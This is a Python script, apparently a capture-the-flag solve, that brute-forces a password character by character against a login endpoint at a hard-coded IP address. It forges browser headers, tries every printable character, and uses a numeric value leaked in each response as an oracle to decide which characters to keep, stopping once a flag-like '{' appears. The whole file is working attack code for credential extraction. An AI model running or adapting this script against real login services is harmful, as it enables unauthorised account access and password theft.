import requests
import string
from requests.utils import quote
import sys

url = 'http://128.238.66.77:3000/login'


def makeReq(password):
    headers = {
        'Host': 'localhost:3000',
        'Content-Length': '43',
        'sec-ch-ua': '\"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"',
        'sec-ch-ua-platform': '\"macOS\"',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.105 Safari/537.36',
        'content-type': 'application/json',
        'Accept': '*/*',
        'Origin': 'http://localhost:8000',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'http://localhost:8000/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'close',
    }

    data = f'{{"username":"user","password":"{password}"}}\x0d\x0a'


    response = requests.post(url,allow_redirects=False ,headers=headers, data=data)
    # print(response.text)
    return response.text


codeTrack = 0;
password = ""

def codeFromResponse(res):
    return int(res.split('=')[-1])

while True:
    for char in string.printable:  # Printable ASCII range
        result = makeReq(quote(password+char))
        if '{' in result:
            print("Password found:",password+char,file=sys.stderr)
            print(password+char)
            exit(0)
        # print("Processing char:",char,file=sys.stderr)
        code = codeFromResponse(result)
        if code > codeTrack:
            password+=char
            print("Password:",password,file=sys.stderr)
            codeTrack = code
            break
